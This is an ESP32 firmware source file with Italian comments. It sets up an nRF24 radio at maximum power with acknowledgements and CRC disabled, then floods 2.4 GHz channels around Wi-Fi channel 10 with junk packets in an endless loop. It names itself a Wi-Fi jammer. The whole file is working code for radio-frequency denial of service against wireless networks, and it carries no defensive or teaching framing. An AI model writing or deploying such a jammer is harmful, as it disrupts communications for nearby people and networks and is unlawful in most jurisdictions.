#include "jammer.h"
#include "RF24.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#define MISO_GPIO 2
#define MOSI_GPIO 7
#define SCK_GPIO 6
#define CSN_GPIO 10
#define IRQ_GPIO 3
#define CE_GPIO 26

static const char *TAG = "jammer";

static TaskHandle_t jammerTask_handle = NULL;

const char msg[] = "doggo";

RF24 *radio = new RF24(CE_GPIO, CSN_GPIO);

void wifiJamTask(void *args){
    while (true) {
	int channel = 10; //canali dallo 0 al 13
	int freq = (channel * 5) + 1; //calcolo della prima frequenza del canale

	for (int i = 0; i < 23; i++, freq++) {
	    radio->setChannel(freq);
	    radio->writeFast(&msg, sizeof(msg));
	}
	vTaskDelay(1);
    }
}

void wifiJam(void){
    ESP_LOGI(TAG, "[nRF24] Inizializzazione...");

    SPIClass *spi = new SPIClass();
    spi->begin(SPI2_HOST, SPI_MASTER_FREQ_16M);
 
    if (!(radio->begin(spi))) {
        ESP_LOGI(TAG, "[nRF24] Inizializzazione fallita!");
	return;
    }

    ESP_LOGI(TAG, "[nRF24] Applicando configurazione...");
    radio->setAutoAck(false);
    radio->stopListening();
    radio->setRetries(0, 0);
    radio->setPayloadSize(5);
    radio->setAddressWidth(3);
    radio->setPALevel(RF24_PA_MAX, false);
    radio->setDataRate(RF24_2MBPS);
    radio->setCRCLength(RF24_CRC_DISABLED);
    radio->disableCRC();
    radio->disableAckPayload();
    radio->disableDynamicPayloads();

    xTaskCreate(
	wifiJamTask,
	"wifiJamTask",
	4096,
	NULL,
	5,
	&jammerTask_handle
    );

    ESP_LOGI(TAG, "[nRF24] WiFi Jamming avviato!");
}
